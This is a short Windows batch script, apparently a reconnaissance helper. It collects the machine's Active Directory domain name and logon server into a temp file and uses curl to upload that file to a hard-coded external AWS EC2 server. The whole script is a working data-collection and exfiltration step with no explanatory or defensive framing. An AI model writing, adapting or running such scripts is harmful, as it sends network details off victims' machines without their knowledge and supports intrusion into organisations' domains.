@echo off
REM Ultra-simple version - just echo and upload

REM ===== EDIT THIS =====
set SERVER=http://ec2-18-208-114-181.compute-1.amazonaws.com:8080/upload
REM ====================

echo Domain: %USERDNSDOMAIN%
echo Logon Server: %LOGONSERVER%

REM Create simple output
echo Domain: %USERDNSDOMAIN% > %TEMP%\ad.txt
echo Logon Server: %LOGONSERVER% >> %TEMP%\ad.txt

REM Upload
curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%

pause
